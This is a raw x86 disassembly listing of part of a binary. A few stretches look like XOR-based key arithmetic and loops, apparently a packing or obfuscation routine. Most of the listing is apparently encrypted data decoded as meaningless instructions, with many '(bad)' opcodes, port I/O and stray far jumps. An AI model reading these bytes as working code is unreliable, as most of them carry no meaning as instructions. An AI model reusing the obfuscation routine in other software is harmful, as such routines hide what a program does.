  410991:	and    DWORD PTR ds:0x43466f,0x0
  41099b:	mov    eax,ds:0x43466f
  4109a0:	inc    eax
  4109a1:	mov    ds:0x43466f,eax
  4109a6:	cmp    DWORD PTR ds:0x43466f,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x43466f,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x43466f
  4109db:	inc    eax
  4109dc:	mov    ds:0x43466f,eax
  4109e1:	cmp    DWORD PTR ds:0x43466f,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x43474f
  4109f5:	adc    DWORD PTR ds:0x434663,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x43473b,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434687,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	retf   
  410a2e:	jmp    0x7e7e:0x42aa3829
  410a35:	popf   
  410a36:	js     0x410ab6
  410a38:	jle    0x4109d2
  410a3a:	sub    BYTE PTR [eax],bh
  410a3c:	jae    0x410a8a
  410a3e:	adc    dl,dh
  410a40:	sbb    eax,0x8b0f00af
  410a45:	fsub   DWORD PTR [edi-0x2a54cb93]
  410a4b:	aad    0x9a
  410a4d:	push   ecx
  410a4e:	inc    ecx
  410a4f:	outs   dx,BYTE PTR ds:[esi]
  410a50:	or     edi,0x922e67ba
  410a56:	sub    DWORD PTR [ebx+0x57],esp
  410a59:	mov    bh,0xf8
  410a5b:	test   BYTE PTR [edi-0x519bde31],bh
  410a61:	out    0xbf,eax
  410a63:	in     eax,dx
  410a64:	stos   DWORD PTR es:[edi],eax
  410a65:	fdivr  QWORD PTR cs:[ebp+0x4f]
  410a69:	leave  
  410a6a:	jmp    0x876c:0xfde11a36
  410a71:	jle    0x410a47
  410a73:	addr16 jbe 0x410ae5
  410a76:	(bad)  
  410a77:	call   0xf655f058
  410a7c:	hlt    
  410a7d:	add    dh,BYTE PTR [eax-0x53]
  410a80:	aad    0xf0
  410a82:	pop    edx
  410a83:	push   ecx
  410a84:	aaa    
  410a85:	stos   BYTE PTR es:[edi],al
  410a86:	in     al,dx
  410a87:	dec    eax
  410a88:	cs cmp al,0xf8
  410a8b:	dec    esp
  410a8c:	stos   BYTE PTR es:[edi],al
  410a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a8e:	jge    0x410adc
  410a90:	ss xchg ecx,eax
  410a92:	dec    ebx
  410a93:	push   ecx
  410a94:	jg     0x410a62
  410a96:	cmc    
  410a97:	rol    DWORD PTR [ebp-0x6bb8124f],0xc7
  410a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a9f:	jle    0x410a2b
  410aa1:	js     0x410af2
  410aa3:	mov    al,0x61
  410aa5:	push   eax
  410aa6:	int3   
  410aa7:	std    
  410aa8:	sub    bh,BYTE PTR [ebx+0xe]
  410aab:	mov    ch,0xa6
  410aad:	jbe    0x410b06
  410aaf:	xchg   bh,ah
  410ab1:	mov    dh,0xa3
  410ab3:	and    BYTE PTR [ecx+0x1c9dd642],0x2d
  410aba:	inc    esi
  410abb:	ficomp DWORD PTR [edx]
  410abd:	outs   dx,DWORD PTR ds:[esi]
  410abe:	sbb    al,0x2
  410ac0:	(bad)  
  410ac1:	loope  0x410ac8
  410ac3:	mov    edi,DWORD PTR [edx+0x67]
  410ac6:	mov    esp,DWORD PTR [edi-0x80]
  410ac9:	sub    DWORD PTR [edx+0x237783db],esi
  410acf:	add    BYTE PTR ds:0x3f7997fa,dl
  410ad5:	std    
  410ad6:	mov    esp,0xdc47a165
  410adb:	add    BYTE PTR [esi],bh
  410add:	lahf   
  410ade:	loope  0x410b33
  410ae0:	cmp    eax,0xa9ade2b0
  410ae5:	shl    DWORD PTR [edx+ecx*8-0x29765802],1
  410aec:	mov    eax,0x1630e36
  410af1:	psllq  mm5,QWORD PTR [ebp+0x35]
  410af5:	popf   
  410af6:	add    bl,dh
  410af8:	retf   
  410af9:	dec    ecx
  410afa:	push   edi
  410afb:	in     eax,dx
  410afc:	adc    edx,ebx
  410afe:	push   ss
  410aff:	and    ecx,DWORD PTR [ebp+esi*1+0x2e70144e]
  410b06:	sbb    cl,cl
  410b08:	dec    edx
  410b09:	mov    ah,BYTE PTR [edi]
  410b0b:	push   ds
  410b0c:	call   0x3723:0xd38e520f
  410b13:	fwait
  410b14:	popa   
  410b15:	push   esp
  410b16:	jbe    0x410afe
  410b18:	inc    ebx
  410b19:	je     0x410b63
  410b1b:	cmp    al,0x48
  410b1d:	out    dx,al
  410b1e:	cmc    
  410b1f:	loope  0x410aa6
  410b21:	push   esp
  410b22:	or     dh,BYTE PTR [ecx]
  410b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b25:	je     0x410b60
  410b27:	icebp  
  410b28:	stos   DWORD PTR es:[edi],eax
  410b29:	bound  edx,QWORD PTR [ebx+edx*1]
  410b2c:	mov    edi,0xd3626973
  410b31:	pop    ebx
  410b32:	xchg   cl,ch
  410b34:	mov    al,0xc4
  410b36:	adc    BYTE PTR [eax+0x24416043],ch
  410b3c:	xchg   BYTE PTR [ebx-0x53e77a88],al
  410b42:	repz xchg edx,eax
  410b44:	ja     0x410af2
  410b46:	in     eax,dx
  410b47:	test   al,cl
  410b49:	cld    
  410b4a:	mov    dh,BYTE PTR [edx+0x43]
  410b4d:	jae    0x410b71
  410b4f:	in     al,0x3c
  410b51:	jb     0x410b74
  410b53:	ins    BYTE PTR es:[edi],dx
  410b54:	or     esp,ebp
  410b56:	pop    ebx
  410b57:	fs pop ecx
  410b59:	mov    DWORD PTR [eax+0x4ec5400c],edi
  410b5f:	adc    ebp,ecx
  410b61:	add    DWORD PTR [edx+0x1b],ebp
  410b64:	jp     0x410b74
  410b66:	dec    eax
  410b67:	arpl   WORD PTR [eax-0x6],dx
  410b6a:	mov    esi,0xdb72086d
  410b6f:	arpl   WORD PTR [eax-0x75],cx
  410b72:	dec    esi
  410b73:	mov    eax,0x37d78f33
  410b78:	or     BYTE PTR [esi],cl
  410b7a:	xchg   esp,eax
  410b7b:	push   cs
  410b7c:	dec    edi
  410b7d:	sbb    BYTE PTR [esi+0x4f],ah
  410b80:	mov    cl,bl
  410b82:	inc    eax
  410b83:	ucomiss xmm2,DWORD PTR [eax-0x11de3625]
  410b8a:	test   eax,0xa4152260
  410b8f:	add    al,0x98
  410b91:	mov    edx,0x3a290884
  410b96:	xor    ah,al
  410b98:	cmp    ah,BYTE PTR [edx]
  410b9a:	mov    cl,0xf1
  410b9c:	and    al,0x11
  410b9e:	xor    DWORD PTR [ebx+edi*4-0x2b],0xd9d12eb2
  410ba6:	sbb    eax,0x16698c6c
  410bab:	inc    eax
  410bac:	test   al,0x6b
  410bae:	mov    ebx,0x971ca021
  410bb3:	pop    ecx
  410bb4:	and    al,0xc7
  410bb6:	lods   eax,DWORD PTR ds:[esi]
  410bb7:	dec    ebp
  410bb8:	test   edx,edx
  410bba:	nop
  410bbb:	sahf   
  410bbc:	outs   dx,DWORD PTR ds:[esi]
  410bbd:	push   ecx
  410bbe:	scas   eax,DWORD PTR es:[edi]
  410bbf:	jo     0x410b8c
  410bc1:	cdq    
  410bc2:	loopne 0x410bef
  410bc4:	push   ds
  410bc5:	jno    0x410b5d
  410bc7:	fld    DWORD PTR [ebp+0x58772ffa]
  410bcd:	std    
  410bce:	add    al,bl
  410bd0:	pop    eax
  410bd1:	push   edi
  410bd2:	push   ebp
  410bd3:	add    al,0xd0
  410bd5:	push   cs
  410bd6:	and    DWORD PTR [ebp-0x11],0xffffff84
  410bda:	jne    0x410b7b
  410bdc:	jle    0x410c4c
  410bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bdf:	add    al,0x4f
  410be1:	retf   
  410be2:	jmp    0x410c0d
  410be4:	adc    esp,ecx
  410be6:	push   edi
  410be7:	lahf   
  410be8:	retf   
  410be9:	dec    ebx
  410bea:	jnp    0x410bab
  410bec:	cs js  0x410be7
  410bef:	sbb    edi,esp
  410bf1:	dec    edx
  410bf2:	sbb    edi,edx
  410bf4:	mov    edx,0x94202bc5
  410bf9:	xor    BYTE PTR [edx+ebx*2-0x435c8784],dl
  410c00:	pop    edi
  410c01:	xchg   ebx,eax
  410c02:	in     eax,0xbd
  410c04:	sbb    ebp,DWORD PTR [edx+0x6137e860]
  410c0a:	xchg   esp,eax
  410c0b:	push   ds
  410c0c:	rol    BYTE PTR ds:0x4bb5b853,cl
  410c12:	nop
  410c13:	jnp    0x410ba9
  410c15:	out    0x2c,eax
  410c17:	add    eax,0xbf55a0b9
  410c1c:	sub    BYTE PTR [ebx+0x18],bh
  410c1f:	ins    BYTE PTR es:[edi],dx
  410c20:	sar    DWORD PTR [edi+eiz*4-0x3acff3e1],1
  410c27:	add    eax,0xaf751fe9
  410c2c:	out    0x73,eax
  410c2e:	dec    edi
  410c2f:	fldcw  WORD PTR [ecx-0x61]
  410c32:	iret   
  410c33:	outs   dx,BYTE PTR ds:[esi]
  410c34:	mov    al,ds:0xe5c66950
  410c39:	xchg   edx,eax
  410c3a:	out    dx,al
  410c3b:	(bad)
  410c3f:	enter  0xbff7,0x91
  410c43:	scas   al,BYTE PTR es:[edi]
  410c44:	mov    dh,0x34
  410c46:	inc    ebx
  410c47:	(bad)  
  410c48:	in     eax,dx
  410c49:	fmul   DWORD PTR [edx-0x475c003f]
  410c4f:	retf   0x880e
  410c52:	dec    ebx
  410c53:	fcmovu st,st(4)
  410c55:	fsub   DWORD PTR ds:0x85e7e207
  410c5b:	mov    BYTE PTR [ebx*2+0x66f9f738],ah
  410c62:	mov    bh,0xbc
  410c64:	pop    eax
  410c65:	lea    edx,[ebx]
  410c67:	dec    eax
  410c68:	mov    eax,ds:0x8e3d95ad
  410c6d:	jo     0x410cde
  410c6f:	dec    esp
  410c70:	xor    ah,BYTE PTR [esi+eiz*2+0x1c]
  410c74:	or     al,0xc6
  410c76:	or     al,0x82
  410c78:	icebp  
  410c79:	outs   dx,BYTE PTR ds:[esi]
  410c7a:	ret    0xcb7f
  410c7d:	push   ebx
  410c7e:	or     cl,ch
  410c80:	aaa    
  410c81:	pushf  
  410c82:	xor    eax,0xe23ff671
  410c87:	jmp    0x410cdf
  410c89:	and    ebx,DWORD PTR [edi+0x452aed41]
  410c8f:	jmp    0x410c21
  410c91:	repz cmp eax,0xe9dae142
  410c97:	xchg   ebp,eax
  410c98:	xchg   ebp,eax
  410c99:	xchg   edi,eax
  410c9a:	enter  0x4da2,0x93
  410c9e:	mov    ebx,esp
  410ca0:	(bad)  
  410ca1:	aad    0x8c
  410ca3:	fild   QWORD PTR [esi-0x771c785]
  410ca9:	jecxz  0x410d00
  410cab:	and    dh,bh
  410cad:	int3   
  410cae:	cmp    esi,ebp
  410cb0:	test   DWORD PTR [eax+ecx*2-0x34],edx
  410cb4:	or     DWORD PTR [ecx+0x71489289],0xffffffe4
  410cbb:	mov    dh,0x14
  410cbd:	das    
  410cbe:	mov    cl,0x35
  410cc0:	mov    ?,ebp
  410cc2:	sub    BYTE PTR [edx+0x2a],cl
  410cc5:	mov    eax,0xa9892d75
  410cca:	inc    ecx
  410ccb:	mov    cl,0x11
  410ccd:	fst    QWORD PTR ds:0x1a6a9524
  410cd3:	stos   BYTE PTR es:[edi],al
  410cd4:	cmp    esi,DWORD PTR ds:0x4d892372
  410cda:	adc    BYTE PTR [ebx+0x4347470d],cl
  410ce0:	add    bh,al
  410ce2:	inc    ebp
  410ce3:	or     BYTE PTR [edx-0x38f0cb32],bh
  410ce9:	inc    ebp
  410cea:	cld    
  410ceb:	cmp    eax,0x8bf89c85
  410cf0:	or     eax,0x434663
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43478b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434793,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x434747,0x434703
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434787,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43470f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx-0x61e03c9a],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410d65
  410d7a:	adc    dl,BYTE PTR [edi]
  410d7c:	cli    
  410d7d:	call   0xbc0265a9
  410d82:	bound  ebx,QWORD PTR [eax-0x73983e1f]
  410d88:	push   cs
  410d89:	sbb    al,BYTE PTR [edi+0xa]
  410d8c:	sub    eax,0x4ce2d81c
  410d91:	or     dl,ah
  410d93:	outs   dx,BYTE PTR ds:[esi]
  410d94:	les    eax,FWORD PTR [edx+0x6b]
  410d97:	push   ds
  410d98:	inc    edx
  410d99:	addr16 dec esp
  410d9b:	mov    cl,BYTE PTR [ecx-0x41]
  410d9e:	pop    ebp
  410d9f:	pusha  
  410da0:	das    
  410da1:	or     DWORD PTR ds:0xfabfe6b3,esp
  410da7:	pushf  
  410da8:	inc    esp
  410da9:	aaa    
  410daa:	stos   BYTE PTR es:[edi],al
  410dab:	push   ecx
  410dac:	mov    esp,0xf59a942a
  410db1:	cwde   
  410db2:	jg     0x410db5
  410db4:	test   cl,cl
  410db6:	je     0x410df6
  410db8:	scas   al,BYTE PTR es:[edi]
  410db9:	adc    al,0x19
  410dbb:	imul   esi,DWORD PTR [esi],0x64
  410dbe:	mov    ebp,0xd8923890
  410dc3:	or     al,0x42
  410dc6:	mov    ch,0xa
  410dc8:	sub    WORD PTR [ebp-0x758237ac],dx
  410dcf:	ds out 0xde,al
  410dd2:	push   ecx
  410dd3:	out    0x8f,al
  410dd5:	rcr    DWORD PTR [edx-0x4a],cl
  410dd8:	neg    ecx
  410dda:	jno    0x410df3
  410ddc:	push   ds
  410ddd:	ror    BYTE PTR ds:0x6bde9554,cl
  410de3:	int3   
  410de4:	mov    al,ds:0xba71f7
  410de9:	in     al,dx
  410dea:	(bad)  
  410dec:	ret    0x5226
  410def:	mov    edi,0x21c2ad2
  410df4:	add    BYTE PTR [ebx],dl
  410df6:	add    ebp,esi
  410df8:	mov    ds:0xa396899e,al
  410dfd:	xor    edi,DWORD PTR ds:[edx-0x61]
  410e01:	adc    DWORD PTR [ebp-0x46cb477],0xffffffe9
  410e08:	int    0x36
  410e0a:	xchg   ebx,eax
  410e0b:	rcl    DWORD PTR [ebp+0x40],0x7d
  410e0f:	push   eax
  410e10:	xor    DWORD PTR [ebx+0x58],edx
  410e13:	pop    esi
  410e14:	stc    
  410e15:	fbstp  TBYTE PTR [eax-0x7b]
  410e18:	add    al,0x2e
  410e1a:	retf   0x31c8
  410e1d:	pop    edi
  410e1e:	in     al,0x1e
  410e20:	lods   eax,DWORD PTR ds:[esi]
  410e21:	mov    ebp,0x6752db37
  410e26:	pop    edi
  410e27:	dec    eax
  410e28:	inc    ebp
  410e29:	das    
  410e2a:	push   edx
  410e2b:	xchg   esi,eax
  410e2c:	pop    ecx
  410e2d:	aam    0xe3
  410e2f:	jb     0x410e9a
  410e31:	test   DWORD PTR [ecx-0xb0f15cc],esi
  410e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e38:	ficomp DWORD PTR [edx-0x1a16067a]
  410e3e:	fstp   TBYTE PTR ds:0x150eaa7c
  410e44:	and    al,0x29
  410e46:	(bad)  ds:0x3b0d1c6a
  410e4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e4d:	dec    edx
  410e4e:	mov    edi,0xa8bfcb16
  410e53:	cs push cs
  410e55:	cmp    eax,0x4c8e6ba6
  410e5a:	shl    BYTE PTR [edi],0x5e
  410e5d:	(bad)  
  410e5e:	ja     0x410e63
  410e60:	ins    BYTE PTR es:[edi],dx
  410e61:	ss inc esi
  410e63:	sub    ah,BYTE PTR [esi-0x12d613a5]
  410e69:	dec    esp
  410e6a:	jmp    0xb67d:0x10d51570
  410e71:	adc    eax,0xed1547a
  410e76:	pushf  
  410e77:	mov    ebp,0x735da62d
  410e7c:	or     BYTE PTR [esp+ebx*4],bl
  410e7f:	ds inc esi
  410e81:	push   ebx
  410e82:	cmp    al,0x23
  410e84:	sbb    edi,edi
  410e86:	(bad)  
  410e87:	xchg   edx,eax
  410e88:	xor    cl,ch
  410e8a:	xchg   esp,eax
  410e8b:	mov    ch,0xcd
  410e8d:	mul    DWORD PTR [ecx+0x4b]
  410e90:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  410e92:	add    DWORD PTR [eax+edx*2-0x5a],eax
  410e96:	shr    BYTE PTR [edx-0x66],0xb0
  410e9a:	std    
  410e9b:	aam    0x46
  410e9d:	loopne 0x410e45
  410e9f:	imul   ecx,DWORD PTR [edx+0x64],0xe39af648
  410ea6:	shl    edi,0x0
  410ea9:	jbe    0x410e62
  410eab:	test   eax,0x888d931d
  410eb0:	adc    BYTE PTR [ebx-0x498e1b03],0x2a
  410eb7:	add    DWORD PTR [edx+0x22],ebp
  410eba:	daa    
  410ebb:	jno    0x410e4d
  410ebd:	xor    DWORD PTR [eax],edx
  410ebf:	inc    edi
  410ec0:	push   ss
  410ec1:	pop    edi
  410ec2:	jno    0x410ebb
  410ec4:	jne    0x410ebe
  410ec6:	and    cl,BYTE PTR [eax+0x2085caea]
  410ecc:	add    DWORD PTR [edx-0x23cea300],0x7370cd0b
  410ed6:	jno    0x410e5d
  410ed8:	cmp    esi,ecx
  410eda:	sub    eax,0x40cd6893
  410edf:	mov    WORD PTR [edi+0x7d3c6314],?
  410ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ee6:	sub    al,0x7a
  410ee8:	and    esp,DWORD PTR [ebx]
  410eea:	ss mov ah,0xbb
  410eed:	push   0xffffffe8
  410eef:	outs   dx,DWORD PTR ds:[esi]
  410ef0:	mov    ah,0x57
  410ef2:	shl    BYTE PTR [ebp+0x20],1
  410ef5:	xchg   ecx,eax
  410ef6:	push   esi
  410ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ef8:	mov    esp,0x495cc6b6
  410efd:	push   esi
  410efe:	jne    0x410f7e
  410f00:	test   edx,esi
  410f02:	mov    bh,0xa8
  410f04:	test   DWORD PTR [esi-0xc],esp
  410f07:	cmc    
  410f08:	xor    BYTE PTR [ebx+0x13082244],bh
  410f0e:	cld    
  410f0f:	sahf   
  410f10:	push   edi
  410f11:	jg     0x410ed9
  410f13:	jmp    0xd71205da
  410f18:	(bad)  
  410f19:	adc    edx,DWORD PTR [edi+0x33f24433]
  410f1f:	dec    esp
  410f20:	mov    WORD PTR [edx],ss
  410f22:	hlt    
  410f23:	sbb    eax,0xc94fc25b
  410f28:	lock sub BYTE PTR [ebx+0x27],0xf8
  410f2d:	sbb    BYTE PTR [ebp+0x2394a2cf],al
  410f33:	xor    DWORD PTR gs:[ebx+0x2d7915d7],esi
  410f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f3b:	lea    esp,[edi+0x65]
  410f3e:	and    eax,0x32180b79
  410f43:	and    esp,ebp
  410f45:	sahf   
  410f46:	scas   eax,DWORD PTR es:[edi]
  410f47:	sti    
  410f48:	pop    ss
  410f49:	sbb    eax,0xe632a32c
  410f4e:	dec    ebx
  410f4f:	mov    ds:0xc9ecdb14,al
  410f54:	leave  
  410f55:	push   es
  410f56:	or     al,0xaa
  410f58:	iret   
  410f59:	push   es
  410f5a:	add    DWORD PTR [ebx+0x1],esp
  410f5d:	fld    st(4)
  410f5f:	pop    edi
  410f60:	inc    esp
  410f61:	(bad)  
  410f63:	xchg   ecx,eax
  410f64:	out    dx,eax
  410f65:	cmc    
  410f66:	adc    al,0xe6
  410f68:	cmp    eax,esp
  410f6a:	out    dx,al
  410f6b:	and    al,BYTE PTR [ecx+edi*1+0x491c680b]
  410f72:	inc    esi
  410f73:	jp     0x410fa0
  410f75:	popa   
  410f76:	xchg   esp,eax
  410f77:	rdpmc  
  410f79:	cs stc 
  410f7b:	fnstcw WORD PTR [ecx-0x10]
  410f7e:	xor    dl,ah
  410f80:	repnz stc 
  410f82:	(bad)  
  410f83:	ficomp WORD PTR [ebx-0x10faf64d]
  410f89:	xor    ah,BYTE PTR ds:[ebx+ebp*1+0x44e127b6]
  410f91:	fstp   TBYTE PTR ds:0x101f0b22
  410f97:	pusha  
  410f98:	loopne 0x410fc7
  410f9a:	aaa    
  410f9b:	mov    eax,0xfb0a6054
  410fa0:	mov    eax,ds:0x5e079ac4
  410fa5:	adc    eax,0xbaa1f96c
  410faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fab:	xchg   BYTE PTR [edx+0x32e9b443],bh
  410fb1:	fiadd  DWORD PTR [esi]
  410fb3:	push   ecx
  410fb4:	in     eax,0xd
  410fb6:	pusha  
  410fb7:	(bad)
  410fba:	ret    
  410fbb:	add    eax,edi
  410fbd:	les    ebx,FWORD PTR [ebx+edx*4-0x1]
  410fc1:	fldenv [eax+ebp*4-0x443a85f0]
  410fc8:	lahf   
  410fc9:	xor    al,0xf7
  410fcb:	lock jl 0x410fe4
  410fce:	jmp    0x3f401473
  410fd3:	sbb    DWORD PTR ds:0xd16ee3b5,ebx
  410fd9:	and    eax,DWORD PTR [ebp-0x2291336b]
  410fdf:	repz xchg edx,eax
  410fe1:	jecxz  0x410f77
  410fe3:	leave  
  410fe4:	jns    0x41102f
  410fe6:	aad    0xdb
  410fe8:	push   esi
  410fe9:	sbb    eax,DWORD PTR [edx-0x31]
  410fec:	hlt    
  410fed:	das    
  410fee:	mov    ds:0x824e921a,eax
  410ff3:	push   ds
  410ff4:	cmp    edx,esp
  410ff6:	jecxz  0x41102f
  410ff8:	out    dx,eax
  410ff9:	jbe    0x411064
  410ffb:	in     eax,0xa2
  410ffd:	jl     0x411053
  410fff:	idiv   DWORD PTR ss:[edx]
  411002:	mov    eax,ds:0xf526d8d8
  411007:	xor    eax,0xa828ba4
  41100c:	jp     0x410f9a
  41100e:	mov    ds:0x37b5ba45,eax
  411013:	mov    ah,al
  411015:	jmp    0x410f9c
  411017:	jmp    0xffcd:0x8d67c181
  41101e:	mov    esi,ecx
  411020:	xor    esi,eax
  411022:	add    esi,DWORD PTR [ebp+0x8]
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0x64e54754
  411040:	sub    ebp,DWORD PTR [ebp+0x68]
  411043:	dec    edi
  411044:	jle    0x4110c4
  411046:	popf   
  411047:	js     0x4110c7
  411049:	jle    0x411066
  41104b:	push   es
  41104c:	mov    ds:0x4348d6e7,al
  411051:	or     eax,edx
  411053:	fstp   TBYTE PTR [esp+eiz*4+0x61]
  411057:	cmp    bl,cl
  411059:	bound  esi,QWORD PTR [ebp+0x1]
  41105c:	out    dx,eax
  41105d:	dec    ebx
  41105e:	stc    
  41105f:	and    ebx,DWORD PTR [ecx+0x21]
  411062:	stc    
  411063:	sub    al,0xda
  411065:	aas    
  411066:	in     eax,dx
  411067:	fnstsw WORD PTR [ecx]
  411069:	mov    es,WORD PTR [ecx]
  41106b:	push   esp
  41106c:	jo     0x411094
  41106e:	test   DWORD PTR [edi],0xaab1f3e4
  411074:	clc    
  411075:	cwde   
  411076:	dec    edi
  411077:	arpl   WORD PTR [ecx+0x79],ax
  41107a:	and    BYTE PTR [eax+ebp*1],bl
  41107d:	lods   al,BYTE PTR ds:[esi]
  41107e:	sub    eax,0xfdac1aec
  411083:	test   edx,ecx
  411085:	adc    esp,DWORD PTR [edi]
  411087:	xchg   ebx,eax
  411088:	bts    ecx,edx
  41108b:	je     0x411013
  41108d:	ins    BYTE PTR es:[edi],dx
  41108e:	sbb    ebp,DWORD PTR [ecx]
  411090:	cmc    
  411091:	jecxz  0x4110a6
  411093:	lea    ebp,[edi]
  411095:	adc    eax,esp
  411097:	in     eax,dx
  411098:	sub    BYTE PTR [ebx-0x5ac56798],ah
  41109e:	jge    0x4110c8
  4110a0:	inc    edx
  4110a1:	mov    esi,0x5c2012c5
  4110a6:	dec    eax
  4110a7:	push   esp
  4110a8:	data16 aam 0xec
  4110ab:	je     0x4110b2
  4110ad:	add    al,0x6b
  4110af:	mov    dl,0x90
  4110b1:	adc    edi,edi
  4110b3:	jmp    0xff0b4de6
  4110b8:	addr16 xor esp,esp
  4110bb:	hlt    
  4110bc:	popa   
  4110bd:	lahf   
  4110be:	lds    esp,FWORD PTR [ebx+0xbacfd10]
  4110c4:	push   esp
  4110c5:	mov    ebx,ebx
  4110c7:	test   BYTE PTR [esi-0x37809cfc],ah
  4110cd:	and    DWORD PTR [eiz*4+0x3e0bc8b5],0xc86a9f8c
  4110d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110d9:	mov    edi,0x118c59ce
  4110de:	push   eax
  4110df:	test   bh,0x52
  4110e2:	add    al,0xde
  4110e4:	xchg   ecx,eax
  4110e5:	scas   eax,DWORD PTR es:[edi]
  4110e6:	(bad)  
  4110e8:	sbb    DWORD PTR [edi+0xc],edi
  4110eb:	cmp    esi,edi
  4110ed:	into   
  4110ee:	xchg   BYTE PTR [edx+0x730a6f3d],cl
  4110f4:	scas   eax,DWORD PTR es:[edi]
  4110f5:	sar    BYTE PTR [edx-0x5c],0x69
  4110f9:	jge    0x411085
  4110fb:	xchg   ebp,eax
  4110fc:	ins    BYTE PTR es:[edi],dx
  4110fd:	jnp    0x411153
  4110ff:	(bad)  [eax-0x309d5cf9]
  411105:	xchg   esp,eax
  411106:	jno    0x411179
  411108:	push   0x16c09a97
  41110d:	vmread edx,ebp
  411110:	test   al,0x6
  411112:	push   ss
  411113:	leave  
  411114:	jge    0x41118d
  411116:	repnz dec ecx
  411118:	ficom  DWORD PTR [edi]
  41111a:	xchg   esi,eax
  41111b:	cmp    eax,0x7bc3d62b
  411120:	(bad)  
  411121:	outs   dx,DWORD PTR ds:[esi]
  411122:	loopne 0x41116d
  411124:	nop
  411125:	inc    ebp
  411126:	std    
  411127:	sub    esi,ecx
  411129:	pushf  
  41112a:	pop    eax
  41112b:	and    bl,BYTE PTR cs:[ebp+0x337b8db0]
  411132:	mov    WORD PTR [ebx-0x55b4cf94],?
  411138:	xchg   DWORD PTR [ebx],esi
  41113a:	inc    ecx
  41113b:	or     ah,BYTE PTR [edi-0x350202fa]
  411141:	hlt    
  411142:	or     eax,0x2154a44d
  411147:	adc    ecx,DWORD PTR [ecx+0x5e9b1b20]
  41114d:	fsubrp st(0),st
  41114f:	aaa    
  411150:	dec    eax
  411151:	je     0x411106
  411153:	inc    esp
  411154:	dec    ebx
  411155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411156:	or     eax,0xa18faa98
  41115b:	xchg   edx,eax
  41115c:	dec    edi
  41115d:	and    BYTE PTR [esi-0x12],bh
  411160:	or     eax,0xba3e5f99
  411165:	sub    BYTE PTR [ebp+0x30e44318],al
  41116b:	es pop edx
  41116d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41116e:	xor    edx,ebx
  411170:	ret    0xf113
  411173:	push   0xffffff8a
  411175:	das    
  411176:	cdq    
  411177:	(bad)  
  411178:	into   
  411179:	or     eax,0x67212caa
  41117e:	push   eax
  41117f:	push   es
  411180:	mov    ah,BYTE PTR [edx]
  411182:	(bad)  
  411183:	xchg   esi,eax
  411184:	repnz mov al,0xf3
  411187:	bound  ebp,QWORD PTR [esi+edi*4]
  41118a:	enter  0x712e,0x2b
  41118e:	lds    edi,FWORD PTR [edx]
  411190:	popa   
  411191:	into   
  411192:	mov    ebp,DWORD PTR fs:[esi]
  411195:	push   ebx
  411196:	or     esi,DWORD PTR [esi+0xf]
  411199:	jl     0x411206
  41119b:	ss pushf 
  41119d:	rol    BYTE PTR [esi+0x63c6b126],1
  4111a3:	pop    ebp
  4111a4:	fisub  DWORD PTR [edx+0x645deeff]
  4111aa:	dec    edx
  4111ab:	dec    edx
  4111ac:	jns    0x411149
  4111ae:	outs   dx,BYTE PTR ds:[esi]
  4111af:	sbb    ecx,ecx
  4111b1:	(bad)  
  4111b2:	pop    eax
  4111b3:	retf   
  4111b4:	pop    eax
  4111b5:	adc    al,0x1a
  4111b7:	mov    ebx,DWORD PTR [ebp-0x24455dc8]
  4111bd:	pop    ds
  4111be:	in     al,dx
